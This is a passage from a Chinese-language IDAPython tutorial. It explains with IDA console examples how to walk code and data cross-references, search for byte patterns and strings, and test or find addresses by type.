WriteFile:dword<br></code></pre></td></tr></table></figure><p>如果我们看<code>idautils.CodeRefsTo(ea, flow)</code>这个例子，我们将看见地址<code>0x10004932</code>是一个到<code>WriteFile</code>的地址。<code>idautils.CodeRefsTo(ea, flow)</code>和<code>idautils.CodeRefsFrom(ea, flow)</code>是用来搜索交叉引用和代码。使用<code>idautils.CodeRefsTo(ea, flow)</code>的限制是它是 API，是动态导入的，然后手动重命名将不会显示为代码交叉引用。我们手动重命名一个<code>dword &quot;RtlCompareMemory&quot;</code>地址使用<code>idc.MakeName(ea, name)</code>。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py">Python&gt; <span class="hljs-built_in">hex</span>(ea)<br><span class="hljs-number">0xa26c78</span><br>Python&gt; idc.MakeName(ea, <span class="hljs-string">&quot;RtlCompareMemory&quot;</span>) <span class="hljs-comment"># 重命名</span><br><span class="hljs-literal">True</span><br>Python&gt; <span class="hljs-keyword">for</span> addr <span class="hljs-keyword">in</span> idautils.CodeRefsTo(ea, <span class="hljs-number">0</span>):<br><span class="hljs-meta">... </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(addr), idc.GetDisasm(addr)) <span class="hljs-comment"># 没有输出</span><br></code></pre></td></tr></table></figure><p><code>IDA</code>将不标记这些<code>APIs</code>作为交叉引用。接下来我们将描述一个一般方式获得所有交叉引用。如果我们想要搜索交叉引用从数据中我们能使用<code>idautils.DataRefsTo(ea)</code>或者<code>idautils.DataRefsFrom(ea)</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py">Python&gt; <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ea), idc.GetDisasm(ea))<br><span class="hljs-number">0x1000e3ec</span> db <span class="hljs-string">&#x27;vnc32&#x27;</span>,<span class="hljs-number">0</span><br>Python&gt;<span class="hljs-keyword">for</span> addr <span class="hljs-keyword">in</span> idautils.DataRefsTo(ea): <br><span class="hljs-meta">... </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(addr),idc.GetDisasm(addr))<br><span class="hljs-number">0x100038ac</span> push offset aVnc32 ; <span class="hljs-string">&quot;vnc32&quot;</span><br></code></pre></td></tr></table></figure><p><code>idautils.DataRefsTo(ea)</code>获取参数的地址，并返回所有交叉引用数据的地址的迭代器</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py">Python&gt;<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ea), idc.GetDisasm(ea))<br><span class="hljs-number">0x100038ac</span> push offset aVnc32 ; <span class="hljs-string">&quot;vnc32&quot;</span><br>Python&gt;<span class="hljs-keyword">for</span> addr <span class="hljs-keyword">in</span> idautils.DataRefsFrom(ea):  <span class="hljs-comment"># 数据交叉引用</span><br><span class="hljs-meta">... </span><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(addr),idc.GetDisasm(addr)<br><span class="hljs-number">0x1000e3ec</span> db <span class="hljs-string">&#x27;vnc32&#x27;</span>,<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>对于逆向和显示地址我们调用<code>idautils.DataRefsFrom(ea)</code>，通过地址作为参数。他返回一 个一个所有地址交叉引用返回给数据的迭代器。使用不同的代码和数据可能有点混乱。如前所述，让我们描述一个更通用的技术。这种方法可以通过调用单个函数获得所有对地址的交叉引用。我们获得到一个地址的所有交叉引用使用<code>idautils.XrefsTo(ea, flags=0)</code>，获得从一个地址到所有交叉引用调用<code>idautils.XrefsFrom(ea, flags=0)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">Python&gt; <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ea), idc.GetDisasm(ea))<br><span class="hljs-number">0x1000eee0</span> unicode <span class="hljs-number">0</span>, &lt;Path&gt;,<span class="hljs-number">0</span><br>Python&gt;<span class="hljs-keyword">for</span> xref <span class="hljs-keyword">in</span> idautils.XrefsTo(ea, <span class="hljs-number">1</span>): <span class="hljs-comment"># 根据后面的参数决定交叉引用对象</span><br><span class="hljs-meta">... </span><span class="hljs-built_in">print</span>(xref.<span class="hljs-built_in">type</span>, idautils.XrefTypeName(xref.<span class="hljs-built_in">type</span>), <span class="hljs-built_in">hex</span>(xref.frm), <span class="hljs-built_in">hex</span>(xref.to), xref.iscode)<br>Python&gt;<br><span class="hljs-number">1</span> Data_Offset <span class="hljs-number">0x1000ac0d</span> <span class="hljs-number">0x1000eee0</span> <span class="hljs-number">0</span><br>Python&gt;<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(xref.frm), idc.GetDisasm(xref.frm))<br><span class="hljs-number">0x1000ac0d</span> push offset KeyName ; <span class="hljs-string">&quot;Path&quot;</span><br></code></pre></td></tr></table></figure><p>第一行显示我的们的地址和一个字符串命名的。我们使用<code>idautils.XrefsTo(ea, 1)</code>获得的所有交叉引用的字符串。我们然后使用<code>xref.type</code>来打印交叉引用类型值。<code>idautils.XrefTypeName(xref.type)</code>被用来打印这个类型的字符串表示。有十二个不同的文件引用类型的值。该值可以在左边看到，它的对应名字可以被看到，如下所示</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-number">0</span> = <span class="hljs-string">&#x27;Data_Unknown&#x27;</span><br><span class="hljs-number">1</span> = <span class="hljs-string">&#x27;Data_Offset&#x27;</span><br><span class="hljs-number">2</span> = <span class="hljs-string">&#x27;Data_Write&#x27;</span><br><span class="hljs-number">3</span> = <span class="hljs-string">&#x27;Data_Read&#x27;</span><br><span class="hljs-number">4</span> = <span class="hljs-string">&#x27;Data_Text&#x27;</span><br><span class="hljs-number">5</span> = <span class="hljs-string">&#x27;Data_Informational&#x27;</span><br><span class="hljs-number">16</span> = <span class="hljs-string">&#x27;Code_Far_Call&#x27;</span><br><span class="hljs-number">17</span> = <span class="hljs-string">&#x27;Code_Near_Call&#x27;</span><br><span class="hljs-number">18</span> = <span class="hljs-string">&#x27;Code_Far_Jump&#x27;</span><br><span class="hljs-number">19</span> = <span class="hljs-string">&#x27;Code_Near_Jump&#x27;</span><br><span class="hljs-number">20</span> = <span class="hljs-string">&#x27;Code_User&#x27;</span><br><span class="hljs-number">21</span> = <span class="hljs-string">&#x27;Ordinary_Flow&#x27;</span><br></code></pre></td></tr></table></figure><p><code>xref.frm</code>打印在哪里引用的地址，<code>xref.to</code>打印被引用的地址。<code>xref.iscode</code>打印是否交叉引用是在一个代码段中。在前面的例子中，我们使用<code>idautils.XrefsTo(ea, 1)</code>的标志设置值为 1。如果这个标志为 0 任何交叉引用将不被显示。我们有如下反汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:1000AAF6 jnb short loc_1000AB02 ; XREF<br>.text:1000AAF8 mov eax, [ebx+0Ch]<br>.text:1000AAFB mov ecx, [esi]<br>.text:1000AAFD sub eax, edi<br>.text:1000AAFF mov [edi+ecx], eax<br>.text:1000AB02<br>.text:1000AB02 loc_1000AB02: ; ea is here()<br>.text:1000AB02 mov byte ptr [ebx], 1<br></code></pre></td></tr></table></figure><p>我们在<code>1000AB02</code>处进行标记。这个地址从<code>1000AAF6</code>有一个交叉引用，但是它也有第二个交叉引用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">Python&gt;<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ea), idc.GetDisasm(ea))<br><span class="hljs-number">0x1000ab02</span> mov byte ptr [ebx], <span class="hljs-number">1</span><br>Python&gt;<span class="hljs-keyword">for</span> xref <span class="hljs-keyword">in</span> idautils.XrefsTo(ea, <span class="hljs-number">1</span>): <br><span class="hljs-meta">... </span><span class="hljs-built_in">print</span>(xref.<span class="hljs-built_in">type</span>, idautils.XrefTypeName(xref.<span class="hljs-built_in">type</span>),<span class="hljs-built_in">hex</span>(xref.frm), <span class="hljs-built_in">hex</span>(xref.to), xref.iscode)<br>Python&gt;<br><span class="hljs-number">19</span> Code_Near_Jump <span class="hljs-number">0x1000aaf6</span> <span class="hljs-number">0x1000ab02</span> <span class="hljs-number">1</span><br>Python&gt;<span class="hljs-keyword">for</span> xref <span class="hljs-keyword">in</span> idautils.XrefsTo(ea, <span class="hljs-number">0</span>): <br><span class="hljs-meta">... </span><span class="hljs-built_in">print</span>(xref.<span class="hljs-built_in">type</span>, idautils.XrefTypeName(xref.<span class="hljs-built_in">type</span>),<br><span class="hljs-built_in">hex</span>(xref.frm), <span class="hljs-built_in">hex</span>(xref.to), xref.iscode)<br>Python&gt;<br><span class="hljs-number">21</span> Ordinary_Flow <span class="hljs-number">0x1000aaff</span> <span class="hljs-number">0x1000ab02</span> <span class="hljs-number">1</span><br><span class="hljs-number">19</span> Code_Near_Jump <span class="hljs-number">0x1000aaf6</span> <span class="hljs-number">0x1000ab02</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>第二个交叉引用是从<code>1000AAFF</code>到<code>1000AB02</code>。交叉引用不会造成分支指令。他们也可以被普通的代码流影响。如果我们设置标志为<code>1 Ordinary_Flow</code>引用类型将不被增加。回到之前的<code>RtlCompareMemory</code>例子。我们能使用<code>idautils.XrefsTo(ea,flow)</code>来获取交叉引用</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs py">Python&gt; <span class="hljs-built_in">hex</span>(ea)<br><span class="hljs-number">0xa26c78</span><br>Python&gt; idc.MakeName(ea, <span class="hljs-string">&quot;RtlCompareMemory&quot;</span>)<br><span class="hljs-literal">True</span><br>Python&gt; <span class="hljs-keyword">for</span> xref <span class="hljs-keyword">in</span> idautils.XrefsTo(ea, <span class="hljs-number">1</span>):<br><span class="hljs-meta">... </span><span class="hljs-built_in">print</span>(xref.<span class="hljs-built_in">type</span>, idautils.XrefTypeName(xref.<span class="hljs-built_in">type</span>), <span class="hljs-built_in">hex</span>(xref.frm), <span class="hljs-built_in">hex</span>(xref.to), xref.iscode)<br>Python&gt;<br><span class="hljs-number">3</span> Data_Read <span class="hljs-number">0xa142a3</span> <span class="hljs-number">0xa26c78</span> <span class="hljs-number">0</span><br><span class="hljs-number">3</span> Data_Read <span class="hljs-number">0xa143e8</span> <span class="hljs-number">0xa26c78</span> <span class="hljs-number">0</span><br><span class="hljs-number">3</span> Data_Read <span class="hljs-number">0xa162da</span> <span class="hljs-number">0xa26c78</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>有时获得所有交叉引用有点多余</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py">Python&gt; <span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(ea), idc.GetDisasm(ea)<br><span class="hljs-number">0xa21138</span> extrn GetProcessHeap:dword<br>Python&gt; <span class="hljs-keyword">for</span> xref <span class="hljs-keyword">in</span> idautils.XrefsTo(ea, <span class="hljs-number">1</span>):<br><span class="hljs-meta">... </span><span class="hljs-built_in">print</span>(xref.<span class="hljs-built_in">type</span>, idautils.XrefTypeName(xref.<span class="hljs-built_in">type</span>), <span class="hljs-built_in">hex</span>(xref.frm), <span class="hljs-built_in">hex</span>(xref.to), xref.iscode)<br>Python&gt;<br><span class="hljs-number">17</span> Code_Near_Call <span class="hljs-number">0xa143b0</span> <span class="hljs-number">0xa21138</span> <span class="hljs-number">1</span><br><span class="hljs-number">17</span> Code_Near_Call <span class="hljs-number">0xa1bb1b</span> <span class="hljs-number">0xa21138</span> <span class="hljs-number">1</span><br><span class="hljs-number">3</span> Data_Read <span class="hljs-number">0xa143b0</span> <span class="hljs-number">0xa21138</span> <span class="hljs-number">0</span><br><span class="hljs-number">3</span> Data_Read <span class="hljs-number">0xa1bb1b</span> <span class="hljs-number">0xa21138</span> <span class="hljs-number">0</span><br>Python&gt; <span class="hljs-built_in">print</span>(idc.GetDisasm(<span class="hljs-number">0xa143b0</span>))<br>call ds:GetProcessHea<br></code></pre></td></tr></table></figure><p>冗长的来自<code>Data_read</code>和<code>Code_near</code>都添加到交叉引用。让所有的地址并将它们添加到一个集合可以使所有有用的地址被留下</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_to_xrefs</span>(<span class="hljs-params">ea</span>):</span><br>xref_set = <span class="hljs-built_in">set</span>([])<br><span class="hljs-keyword">for</span> xref <span class="hljs-keyword">in</span> idautils.XrefsTo(ea, <span class="hljs-number">1</span>):<br>xref_set.add(xref.frm)<br><span class="hljs-keyword">return</span> xref_set<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_frm_xrefs</span>(<span class="hljs-params">ea</span>):</span><br>xref_set = <span class="hljs-built_in">set</span>([])<br><span class="hljs-keyword">for</span> xref <span class="hljs-keyword">in</span> idautils.XrefsFrom(ea, <span class="hljs-number">1</span>):<br>xref_set.add(xref.to)<br><span class="hljs-keyword">return</span> xref_set<br></code></pre></td></tr></table></figure><p>例如剩下的函数<code>GetProcessHeap</code>的例子</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py">Python&gt; <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ea), idc.GetDisasm(ea))<br><span class="hljs-number">0xa21138</span> extrn GetProcessHeap:dword<br>Python&gt; get_to_xrefs(ea)<br><span class="hljs-built_in">set</span>([<span class="hljs-number">10568624</span>, <span class="hljs-number">10599195</span>])<br>Python&gt; [<span class="hljs-built_in">hex</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> get_to_xrefs(ea)]<br>[<span class="hljs-string">&#x27;0xa143b0&#x27;</span>, <span class="hljs-string">&#x27;0xa1bb1b&#x27;</span>]<br></code></pre></td></tr></table></figure><h2 id="搜索">搜索</h2><p>我们已经遍历了一些基本的我们所知道的函数或指令。这是有用的，但是有时我们需要 搜索特殊的字节例如<code>0x55 0x8B 0xEC</code>。这些字节搭配是经典的功能语句<code>push ebp</code>，<code>mov ebp</code>， <code>esp</code>。为了搜索这些字节或者二进制搭配我们可以使用<code>idc.FindBinary(ea, flag, searchstr, radix=16)</code>。<code>ea</code>是我们想要搜索的地址从标志是字典或条件中。这里有一些不同类型的标志。 名称和值如下所示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">SEARCH_UP = 0<br>SEARCH_DOWN = 1<br>SEARCH_NEXT = 2<br>SEARCH_CASE = 4<br>SEARCH_REGEX = 8<br>SEARCH_NOBRK = 16<br>SEARCH_NOSHOW = 32<br>SEARCH_UNICODE = 64 **<br>SEARCH_IDENT = 128 **<br>SEARCH_BRK = 256 **<br>** 较老的IDA版本可能不支持<br></code></pre></td></tr></table></figure><p>并不是所有这些标志都值得掌握，而是一些最常用的标志。</p><p><code>SEARCH_UP</code>和<code>SEARCH_DOWN</code>被用来选择字典我们希望我们搜索到接下来的。</p><p><code>SEARCH_NEXT</code>被用来获得下一个找到的对象。</p><p><code>SEARCH_CASE</code>被用于指定大小写敏感度。</p><p><code>SEARCH_NOSHOW</code>将不显示搜索过程。</p><p><code>SEARCH_UNICODE</code>被用来处理所有的<code>Unicode</code>字符串搜索。</p><p>我们正在寻找的模式是<code>searchstr</code>。<code>radix</code>被使用当正在写入进程模块时。本课题是此文章讨论的范围之外。我将推荐阅读《IDA Pro 权威指南》第 19 章。现在<code>radix</code>字段可以留空。快速浏览一下前面提到的函数语句字节模式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">Python&gt; pattern = <span class="hljs-string">&#x27;55 8B EC&#x27;</span><br>addr = MinEA()<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">5</span>):<br><span class="hljs-meta">... </span>addr = idc.FindBinary(addr, SEARCH_DOWN, pattern);<br><span class="hljs-meta">... </span><span class="hljs-keyword">if</span> addr != idc.BADADDR:<br>    ... <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(addr), idc.GetDisasm(addr))<br>Python&gt;<br><span class="hljs-number">0x401000</span> push ebp<br><span class="hljs-number">0x401000</span> push ebp<br><span class="hljs-number">0x401000</span> push ebp<br><span class="hljs-number">0x401000</span> push ebp<br><span class="hljs-number">0x401000</span> push ebp<br></code></pre></td></tr></table></figure><p>在第一行我们发现我们搜索的部分。被搜索的部分能以 16 进制的形式开始带 <code>0x</code> 作为在<code>0x55 0x8B 0xEC</code>或者作为字节 <code>55 8B EC</code>出现在<code>IDA</code>的 16 进制窗口。<code>\x55\x8B\xEC</code>不能被使用,除非我们使用<code>idc.FindText(ea, flag, y, x, searchstr)</code>。<code>MinEA()</code>被用来获得第一个地址在可执行的位置。然后我们将<code>idc.FindBinary(ea, flag, searchstr, radix=16)</code>返回的给一个叫做<code>addr</code>的变量。</p><p>在搜索时验证搜索有没有找到匹配部分是十分重要的。它通过对比<code>addr</code>的<code>idc.BADADDR</code>。然后打印地址和反汇编。</p><p>注意到地址没有增加吗？这是因为我们没有设定<code>SEARCH_NEXT 标志</code>。当设立该标志时，如果上一个地址包含我们的字节部分搜索将不在通过。如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">Python&gt; pattern = <span class="hljs-string">&#x27;55 8B EC&#x27;</span><br>addr = MinEA()<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">5</span>):<br><span class="hljs-meta">... </span>addr = idc.FindBinary(addr, SEARCH_DOWN|SEARCH_NEXT,pattern);<br><span class="hljs-meta">... </span><span class="hljs-keyword">if</span> addr != idc.BADADDR:<br>    ... <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(addr), idc.GetDisasm(addr))<br>Python&gt;<br><span class="hljs-number">0x401040</span> push ebp<br><span class="hljs-number">0x401070</span> push ebp<br><span class="hljs-number">0x4010e0</span> push ebp<br><span class="hljs-number">0x401150</span> push ebp<br><span class="hljs-number">0x4011b0</span> push ebp<br></code></pre></td></tr></table></figure><p>搜索字节是十分有帮助的，但是有时候我们也许想要搜索字符串例如“<code>chrome.dll</code>”。我们可以转换字符串到 16 进制字节，使用<code>[hex(y) for y in bytearray(&quot;chrome.dll&quot;)]</code>但是这有一点丑陋。另外，如果字符串是<code>Unicode</code>，我们必须解释这种格式。最简单的方式是使用<code>FindText(ea, flag, y, x, searchstr)</code>。大多数字节应该看起来相似，因为他们是相同的作为<code>idc.FindBinary</code>。<code>ea</code>是开始地址，<code>flag</code>是方向和类型用于搜索。<code>y</code>是要搜索的<code>ea</code>中的行数，<code>x</code>是行中的坐标。这些字段通常分配为 0。现在搜索出现的字符串“<code>Accept</code>”。对于这个例子任何字符串从字符串窗口按<code>shift+F12</code>能使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">Python&gt; cur_addr = MinEA()<br>end = MaxEA()<br><span class="hljs-keyword">while</span> cur_addr &lt; end:<br><span class="hljs-meta">... </span>cur_addr = idc.FindText(cur_addr, SEARCH_DOWN, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<span class="hljs-string">&quot;Accept&quot;</span>)<br><span class="hljs-keyword">if</span> cur_addr == idc.BADADDR:<br><span class="hljs-meta">... </span><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br><span class="hljs-meta">... </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(cur_addr), idc.GetDisasm(cur_addr))<br><span class="hljs-meta">... </span>cur_addr = idc.NextHead(cur_addr)<br>Python&gt;<br><span class="hljs-number">0x40da72</span> push offset aAcceptEncoding; <span class="hljs-string">&quot;Accept-Encoding:\n&quot;</span><br><span class="hljs-number">0x40face</span> push offset aHttp1_1Accept; <span class="hljs-string">&quot; HTTP/1.1\r\nAccept: */*</span><br><span class="hljs-string">\r\n &quot;</span><br><span class="hljs-number">0x40fadf</span> push offset aAcceptLanguage; <span class="hljs-string">&quot;Accept-Language: ru</span><br><span class="hljs-string">\r\n&quot;</span><br>...<br><span class="hljs-number">0x423c00</span> db <span class="hljs-string">&#x27;Accept&#x27;</span>,<span class="hljs-number">0</span><br><span class="hljs-number">0x423c14</span> db <span class="hljs-string">&#x27;Accept-Language&#x27;</span>,<span class="hljs-number">0</span><br><span class="hljs-number">0x423c24</span> db <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>,<span class="hljs-number">0</span><br><span class="hljs-number">0x423ca4</span> db <span class="hljs-string">&#x27;Accept-Ranges&#x27;</span>,<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>我们使用<code>MinEA()</code>获得最小地址和将其赋值给变量名<code>cur_addr</code>。同样的做法对于最大地址调用<code>MaxEA()</code>和赋值返回给变量名<code>end</code>。由于我们不知道字符串出现的次数，我们需要检查搜索是否继续下去，并且小于最大地址。我们然后赋值<code>idc.FindText</code>的返回值给当前地址。因为我们将手动增加地址通过调用<code>idc.NextHead(ea)</code>。我们不需要<code>SEARCH_NEXT</code>这个标志。理由是我们手动增加当前地址到接下来的行中是因为一个字符串能在一行中出现多次。这便使它很难获得下一个字符串的地址。</p><p>除了前面描述的模式搜索外，还有两个函数可用于查找其他类型。根据<code>API</code>的名称可以很容易的推断出函数的整体功能。在讨论寻找不同类型之前，我们首先通过地址来识别类型。有一个<code>API</code>的子集，首先是可以用来确定一个地址类型。这个<code>APIs</code>返回一个<code>True</code>或<code>False</code>的布尔值。</p><h3 id="idc-isCode-f">idc.isCode(f)</h3><p>如果<code>IDA</code>标记地址为代码，返回<code>True</code>。</p><h3 id="idc-isData-f">idc.isData(f)</h3><p>如果<code>IDA</code>标记地址为数据，返回<code>True</code>。</p><h3 id="idc-isTail-f">idc.isTail(f)</h3><p>如果<code>IDA</code>标记地址为尾部，返回<code>True</code>。</p><h3 id="idc-isUnknown-f">idc.isUnknown(f)</h3><p>如果<code>IDA</code>标记地址为未知，返回<code>True</code>。这个类型被使用当<code>IDA</code>没有标识地址是代码还是数据。</p><h3 id="idc-isHead-f">idc.isHead(f)</h3><p>如果<code>IDA</code>标记地址为头部，返回<code>True</code>。我们首先需要一个内部的标志来表示，然后通过<code>idc.is</code>设置函数。为获得这个内部标志我们使用<code>idc.GetFlags(ea)</code>。现在我们有了一个基本的功能，如何对不同类型的函数使用，让我们举一个简单的例子。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">Python&gt; <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ea), idc.GetDisasm(ea))<br><span class="hljs-number">0x10001000</span> push ebp<br>Python&gt; idc.isCode(idc.GetFlags(ea))<br><span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><h3 id="idc-FindCode-ea-flag">idc.FindCode(ea, flag)</h3><p>它被用来找到下一个被标记为代码的地址。如果我们想找到一个数据块的结束，这将十分有用。如果<code>ea</code>是一个已经作为代码被标记的地址它将返回下一个地址。这个<code>flag</code>将被用来提前描述<code>idc.FindText</code>。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py">Python&gt; <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ea), idc.GetDisasm(ea))<br><span class="hljs-number">0x4140e8</span> dd offset dword_4140EC<br>Python&gt; addr = idc.FindCode(ea, SEARCH_DOWN|SEARCH_NEXT)<br>Python&gt; <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(addr), idc.GetDisasm(addr))<br><span class="hljs-number">0x41410c</span> push ebx<br></code></pre></td></tr></table></figure><p>我们能了解<code>ea</code>是地址<code>0x4140e8</code>的一些数据。我们赋值<code>idc.FindCode(ea, SEARCH_DOWN|SEARCH_NEXT)</code>的返回值给<code>addr</code>。然后我们打印<code>addr</code>和它的汇编。通过调用一个函数，我们跳过开始标记为代码 36 字节数据的部分。</p><h3 id="idc-FindData-ea-flag">idc.FindData(ea, flag)</h3><p>这的使用方式和<code>idc.findcode</code>完全一样，除了它将返回下一个地址被标记为一个数据块的开始</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py">Python&gt; <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ea), idc.GetDisasm(ea))<br><span class="hljs-number">0x41410c</span> push ebx<br>Python&gt; addr = idc.FindData(ea, SEARCH_UP|SEARCH_NEXT)<br>Python&gt; <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(addr), idc.GetDisasm(addr))<br><span class="hljs-number">0x4140ec</span> dd 49540E0Eh, 746E6564h, 4570614Dh, 7972746Eh, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>,<br>4010BCh<br></code></pre></td></tr></table></figure><p>只有一点比前面的例子稍有不同的是<code>SEARCH_UP|SEARCH_NEXT</code>的方向和搜索的数据</p><h3 id="idc-FindUnexplored-ea-flag">idc.FindUnexplored(ea, flag)</h3><p>这个函数是用来寻找的字节地址，<code>IDA</code>没有识别码或数据。<code>unknown</code>类型将需要进一步的人工分析或通过脚本观察。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py">Python&gt; <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ea), idc.GetDisasm(ea))<br><span class="hljs-number">0x406a05</span> jge short loc_406A3A<br>Python&gt; addr = idc.FindUnexplored(ea, SEARCH_DOWN)<br>Python&gt; <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(addr), idc.GetDisasm(addr))<br><span class="hljs-number">0x41b004</span> db 0DFh ; ?<br></code></pre></td></tr></table></figure><h3 id="idc-FindExplored-ea-flag">idc.FindExplored(ea, flag)</h3><p>它是用来寻找一个地址，IDA 